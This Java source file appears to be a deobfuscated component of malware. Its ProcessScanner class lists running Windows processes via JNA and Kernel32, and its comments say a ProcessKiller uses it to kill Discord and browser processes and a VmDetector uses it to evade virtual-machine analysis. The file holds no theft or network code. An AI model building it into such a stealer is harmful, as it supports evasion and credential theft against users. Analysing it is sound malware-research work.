import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinNT;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Process Scanner
 * Obfuscated name: с (U+0441)
 *
 * Scans running processes using Windows Kernel32 API via JNA.
 * Used by ProcessKiller and VmDetector to find and terminate processes.
 *
 * Functionality:
 * - Enumerate all running processes (CreateToolhelp32Snapshot)
 * - Find processes by name
 * - Get process IDs by name
 * - Check if a specific process is running
 * - Get process executable path
 *
 * Used by:
 * - ProcessKiller: to find and kill Discord/browser processes
 * - VmDetector: to check for VM-specific processes
 * - MainOrchestrator: to check if Discord is running
 */
public class ProcessScanner {

    // =========================================================
    // PROCESS ENUMERATION
    // =========================================================

    /**
     * Gets a list of all running process names.
     *
     * @return List of process names (e.g., ["discord.exe", "chrome.exe", ...])
     */
    public static List<String> getRunningProcessNames() {
        List<String> names = new ArrayList<>();
        try {
            ProcessHandle.allProcesses().forEach(ph -> {
                ph.info().command().ifPresent(cmd -> {
                    names.add(new File(cmd).getName());
                });
            });
        } catch (Exception e) {
            // Fallback to Kernel32 Toolhelp32
            names.addAll(getProcessNamesViaToolhelp());
        }
        return names;
    }

    /**
     * Gets process names using Windows Toolhelp32 API.
     * More reliable than ProcessHandle for some Windows versions.
     *
     * Windows API:
     * 1. CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     * 2. Process32First(snapshot, &pe32)
     * 3. Loop: Process32Next(snapshot, &pe32)
     * 4. CloseHandle(snapshot)
     */
    private static List<String> getProcessNamesViaToolhelp() {
        List<String> names = new ArrayList<>();
        try {
            com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference pe32 =
                new com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference();

            WinNT.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                com.sun.jna.platform.win32.Tlhelp32.TH32CS_SNAPPROCESS,
                new com.sun.jna.platform.win32.WinDef.DWORD(0)
            );

            if (Kernel32.INSTANCE.Process32First(snapshot, pe32)) {
                do {
                    names.add(new String(pe32.szExeFile).trim().replace("\0", ""));
                } while (Kernel32.INSTANCE.Process32Next(snapshot, pe32));
            }

            Kernel32.INSTANCE.CloseHandle(snapshot);
        } catch (Exception e) {
            // Silently fail
        }
        return names;
    }

    /**
     * Checks if a process with the given name is running.
     *
     * @param processName Process name to check (e.g., "discord.exe")
     * @return true if process is running
     */
    public static boolean isProcessRunning(String processName) {
        return getRunningProcessNames().stream()
            .anyMatch(name -> name.equalsIgnoreCase(processName));
    }

    /**
     * Gets the PID of a process by name.
     *
     * @param processName Process name to find
     * @return Process ID, or -1 if not found
     */
    public static int getProcessId(String processName) {
        try {
            com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference pe32 =
                new com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference();

            WinNT.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                com.sun.jna.platform.win32.Tlhelp32.TH32CS_SNAPPROCESS,
                new com.sun.jna.platform.win32.WinDef.DWORD(0)
            );

            if (Kernel32.INSTANCE.Process32First(snapshot, pe32)) {
                do {
                    String name = new String(pe32.szExeFile).trim().replace("\0", "");
                    if (name.equalsIgnoreCase(processName)) {
                        Kernel32.INSTANCE.CloseHandle(snapshot);
                        return pe32.th32ProcessID.intValue();
                    }
                } while (Kernel32.INSTANCE.Process32Next(snapshot, pe32));
            }

            Kernel32.INSTANCE.CloseHandle(snapshot);
        } catch (Exception e) {
            // Silently fail
        }
        return -1;
    }

    /**
     * Gets all PIDs for processes with the given name.
     * (Multiple instances may be running)
     *
     * @param processName Process name to find
     * @return List of process IDs
     */
    public static List<Integer> getAllProcessIds(String processName) {
        List<Integer> pids = new ArrayList<>();
        try {
            com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference pe32 =
                new com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32.ByReference();

            WinNT.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                com.sun.jna.platform.win32.Tlhelp32.TH32CS_SNAPPROCESS,
                new com.sun.jna.platform.win32.WinDef.DWORD(0)
            );

            if (Kernel32.INSTANCE.Process32First(snapshot, pe32)) {
                do {
                    String name = new String(pe32.szExeFile).trim().replace("\0", "");
                    if (name.equalsIgnoreCase(processName)) {
                        pids.add(pe32.th32ProcessID.intValue());
                    }
                } while (Kernel32.INSTANCE.Process32Next(snapshot, pe32));
            }

            Kernel32.INSTANCE.CloseHandle(snapshot);
        } catch (Exception e) {
            // Silently fail
        }
        return pids;
    }
}
